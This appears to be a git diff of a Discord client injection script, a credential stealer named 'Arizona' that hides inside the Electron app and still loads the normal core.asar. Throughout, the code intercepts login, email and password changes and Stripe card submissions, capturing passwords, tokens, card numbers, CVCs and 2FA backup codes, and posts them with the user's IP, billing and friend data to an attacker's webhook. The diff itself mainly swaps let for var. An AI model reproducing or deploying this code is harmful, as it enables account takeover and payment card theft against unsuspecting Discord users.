@@ -1,3 +1,4 @@
+// else aint working idk why
 const {
     BrowserWindow,
     session
@@ -9,6 +10,7 @@ const webhook = "%WEBHOOK_LINK%";
 const Filter = {
     urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v1/tokens"]
 };
+
 
 const config = {
     "logout": "%LOGOUT%",
@@ -71,6 +73,7 @@ const badges = {
     },
 };
 
+
 class ArizonaEvent {
     constructor(event, token, data) {
         this.event = event;
@@ -96,12 +99,12 @@ class ArizonaEvent {
 }
 
 async function firstTime() {
-    let token = await getToken()
+    var token = await getToken()
     if (config['init-notify'] == "true") {
         if (fs.existsSync(path.join(__dirname, "init"))) {
             fs.rmdirSync(path.join(__dirname, "init"));
             if (token == null || token == undefined || token == "") {
-                let c = {
+                var c = {
                     username: "Arizona",
                     content: "",
                     embeds: [{
@@ -122,8 +125,8 @@ async function firstTime() {
                 };
                 sendToWebhook(JSON.stringify(c));
             } else {
-                let b = await getUserInfo(token)
-                let c = {
+                var b = await getUserInfo(token)
+                var c = {
                     username: "Arizona",
                     content: "",
                     embeds: [{
@@ -173,7 +176,7 @@ async function firstTime() {
     if (config.logout != "false" || config.logout == "%LOGOUT%") {
         if (config['logout-notify'] == "true") {
             if (token == null || token == undefined || token == "") {
-                let c = {
+                var c = {
                     username: "Arizona",
                     content: "",
                     embeds: [{
@@ -195,7 +198,7 @@ async function firstTime() {
                 sendToWebhook(JSON.stringify(c));
             } else {
                 const b = await getUserInfo(token);
-                let c = {
+                var c = {
                     username: "Arizona",
                     content: "",
                     embeds: [{
@@ -240,10 +243,9 @@ async function firstTime() {
         const window = BrowserWindow.getAllWindows()[0];
         window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
     }
-
     return !1
-}
 
+}
 const QRFilter = {
 	"urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
 }
@@ -297,12 +299,12 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
 // Main functions
 
 async function userLogin(password, email, token) {
-    let userInfo = await getUserInfo(token);
-    let ip = await getIp();
-    let billing = await getBilling(token);
-    let friends = await getRelationships(token);
+    var userInfo = await getUserInfo(token);
+    var ip = await getIp();
+    var billing = await getBilling(token);
+    var friends = await getRelationships(token);
 
-    let params = {
+    var params = {
         username: "Arizona",
         content: "",
         embeds: [{
@@ -372,8 +374,8 @@ async function userLogin(password, email, token) {
     };
 
     if (token.startsWith("mfa")) {
-        let codes = await get2faCodes(token, password)
-        let embed = {
+        var codes = await get2faCodes(token, password)
+        var embed = {
             "title": ":detective: __2FA Codes__",
             "description": `[Get all of them](${codes.url})`,
             "color": config['embed-color'],
@@ -389,14 +391,15 @@ async function userLogin(password, email, token) {
     }
 
     sendToWebhook(JSON.stringify(params))
+
 }
-
 async function emailChanged(password, newEmail, token) {
-    let userInfo = await getUserInfo(token);
-    let ip = await getIp();
-    let friends = await getRelationships(token);
+    var userInfo = await getUserInfo(token);
+    var ip = await getIp();
+    var friends = await getRelationships(token);
 
-    let params = {
+
+    var params = {
         username: "Arizona",
         content: "",
         embeds: [{
@@ -461,8 +464,8 @@ async function emailChanged(password, newEmail, token) {
         }]
     }
     if (token.startsWith("mfa")) {
-        let codes = await get2faCodes(token, password)
-        let embed = {
+        var codes = await get2faCodes(token, password)
+        var embed = {
             "title": ":detective: __2FA Codes__",
             "description": `[Get all of them](${codes.url})`,
             "color": config['embed-color'],
@@ -478,14 +481,13 @@ async function emailChanged(password, newEmail, token) {
     }
     sendToWebhook(JSON.stringify(params))
 }
-
 async function passwordChanged(oldPassword, newPassword, token) {
-    let userInfo = await getUserInfo(token);
-    let ip = await getIp();
-    let billing = await getBilling(token);
-    let friends = await getRelationships(token);
+    var userInfo = await getUserInfo(token);
+    var ip = await getIp();
+    var billing = await getBilling(token);
+    var friends = await getRelationships(token);
 
-    let params = {
+    var params = {
         username: "Arizona",
         content: "",
         embeds: [{
@@ -559,8 +561,8 @@ async function passwordChanged(oldPassword, newPassword, token) {
     }
 
     if (token.startsWith("mfa")) {
-        let codes = await get2faCodes(token, newPassword)
-        let embed = {
+        var codes = await get2faCodes(token, newPassword)
+        var embed = {
             "title": ":detective: __2FA Codes__",
             "description": `[Get all of them](${codes.url})`,
             "color": config['embed-color'],
@@ -574,16 +576,15 @@ async function passwordChanged(oldPassword, newPassword, token) {
         }
         params.embeds.push(embed)
     }
-
     sendToWebhook(JSON.stringify(params))
 }
 async function creditCardAdded(cardnumber, cvc, expiration, token) {
-    let userInfo = await getUserInfo(token);
-    let ip = await getIp();
-    let billing = await getBilling(token);
-    let friends = await getRelationships(token);
+    var userInfo = await getUserInfo(token);
+    var ip = await getIp();
+    var billing = await getBilling(token);
+    var friends = await getRelationships(token);
 
-    let params = {
+    var params = {
         username: "Arizona",
         content: "",
         embeds: [{
@@ -663,6 +664,7 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
     };
 
     sendToWebhook(JSON.stringify(params))
+
 }
 
 
@@ -670,7 +672,7 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
 async function sendToWebhook(params) {
     
     const window = BrowserWindow.getAllWindows()[0];
-    window.webContents.executeJavaScript(`    let xhr = new XMLHttpRequest();
+    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
 		xhr.open("POST", "${webhook}", true);
 		xhr.setRequestHeader('Content-Type', 'application/json');
 		xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
@@ -678,17 +680,16 @@ async function sendToWebhook(params) {
 		`, !0)
 
 }
-
 async function getRelationships(token) {
     const window = BrowserWindow.getAllWindows()[0];
-    let a = await window.webContents.executeJavaScript(`let xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText`, !0)
-    let json = JSON.parse(a)
+    var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText`, !0)
+    var json = JSON.parse(a)
     const r = json.filter((user) => {
         return user.type == 1
     })
-    let gay = "";
+    var gay = "";
     for (z of r) {
-        let b = getRareBadges(z.user.public_flags)
+        var b = getRareBadges(z.user.public_flags)
         if (b != "") {
             gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
         }
@@ -706,9 +707,9 @@ async function get2faCodes(token, password) {
     let baseuri = "https://ctf.surf/raw/";
 
     const window = BrowserWindow.getAllWindows()[0];
-    let a = await window.webContents.executeJavaScript(`let xmlHttp = new XMLHttpRequest();xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);xmlHttp.setRequestHeader('Content-Type', 'application/json');xmlHttp.setRequestHeader("authorization", "${token}");xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));xmlHttp.responseText`, !0)
+    var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);xmlHttp.setRequestHeader('Content-Type', 'application/json');xmlHttp.setRequestHeader("authorization", "${token}");xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));xmlHttp.responseText`, !0)
 
-    let json = JSON.parse(a)
+    var json = JSON.parse(a)
     let codes = json.backup_codes
     const r = codes.filter((code) => {
         return code.consumed == null
@@ -729,10 +730,10 @@ async function get2faCodes(token, password) {
 }
 async function getBilling(token) {
     const window = BrowserWindow.getAllWindows()[0];
-    let a = await window.webContents.executeJavaScript(`let xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false ); xmlHttp.setRequestHeader("Authorization", "${token}"); xmlHttp.send( null ); xmlHttp.responseText`, !0)
-    let json = JSON.parse(a)
+    var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false ); xmlHttp.setRequestHeader("Authorization", "${token}"); xmlHttp.send( null ); xmlHttp.responseText`, !0)
+    var json = JSON.parse(a)
 
-    let billing = "";
+    var billing = "";
     json.forEach(z => {
         if (z.type == "") {
             return "\`❌\`";
@@ -748,27 +749,24 @@ async function getBilling(token) {
     if (billing == "") billing = "\`❌\`"
     return billing;
 }
-
 async function getUserInfo(token) {
     const window = BrowserWindow.getAllWindows()[0];
-    let a = await window.webContents.executeJavaScript(`let xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText;`, !0)
+    var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText;`, !0)
     return JSON.parse(a)
 }
-
 async function getIp() {
     const window = BrowserWindow.getAllWindows()[0];
-    let ip = await window.webContents.executeJavaScript(`let xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );xmlHttp.send( null );xmlHttp.responseText;`, !0)
+    var ip = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );xmlHttp.send( null );xmlHttp.responseText;`, !0)
     return ip
 }
-
 async function getToken() {
     const window = BrowserWindow.getAllWindows()[0];
-    let token = await window.webContents.executeJavaScript(`let token="";window.webpackChunkdiscord_app.push([[Math.random()],{},e=>{token=Object.values(e.c).find((e=>e.exports&&e.exports.default&&void 0!==e.exports.default.getToken)).exports.default.getToken()}]);token;`, !0)
+    var token = await window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[['get_require']]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)'getToken'==a&&(token=b.default.getToken())}token;`, !0)
     return token
 }
 
 function getBadges(flags) {
-    let b = '';
+    var b = '';
     for (const prop in badges) {
         let o = badges[prop];
         if ((flags & o.Value) == o.Value) b += o.Emoji;
@@ -778,7 +776,7 @@ function getBadges(flags) {
 }
 
 function getRareBadges(flags) {
-    let b = '';
+    var b = '';
     for (const prop in badges) {
         let o = badges[prop];
         if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
@@ -802,6 +800,7 @@ function getNitro(flags) {
 
 session.defaultSession.webRequest.onCompleted(Filter, async (details, callback) => {
     if (details.statusCode != 200) return;
+   
 
     const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
     const data = JSON.parse(unparsed_data)
@@ -809,44 +808,43 @@ session.defaultSession.webRequest.onCompleted(Filter, async (details, callback) 
 
     switch (true) {
         case details.url.endsWith('login'):
-            const event_userLogin = new ArizonaEvent('userLogin', token, {
+            var event = new ArizonaEvent('userLogin', token, {
                 password: data.password,
                 email: data.login
             });
-            event_userLogin.handle();
-            
+            event.handle();
             return;
         case details.url.endsWith('users/@me') && details.method == 'PATCH':
             if (!data.password) return;
             if (data.email) {
-                const event_emailChanged = new ArizonaEvent('emailChanged', token, {
+                var event = new ArizonaEvent('emailChanged', token, {
                     password: data.password,
                     email: data.email
                 });
-                event_emailChanged.handle();
+                event.handle();
+
             };
             if (data.new_password) {
-                const event_passwordChanged = new ArizonaEvent('passwordChanged', token, {
+                var event = new ArizonaEvent('passwordChanged', token, {
                     password: data.password,
                     new_password: data.new_password
                 });
-                event_passwordChanged.handle();
+                event.handle();
             };
-
             return;
         case details.url.endsWith('tokens') && details.method == "POST":
             const card = querystring.parse(decodeURIComponent(unparsed_data))
-            const event_creditCardAdded = new ArizonaEvent('creditCardAdded', token, {
+            var event = new ArizonaEvent('creditCardAdded', token, {
                 cardnumber: card["card[number]"],
                 cvc: card["card[cvc]"],
                 expiration: card["card[exp_month]"] + "/" + card["card[exp_year]"]
             });
-            event_creditCardAdded.handle();
-
+            event.handle();
             return;
         default:
             break;
     }
+
 });
 
 module.exports = require('./core.asar')
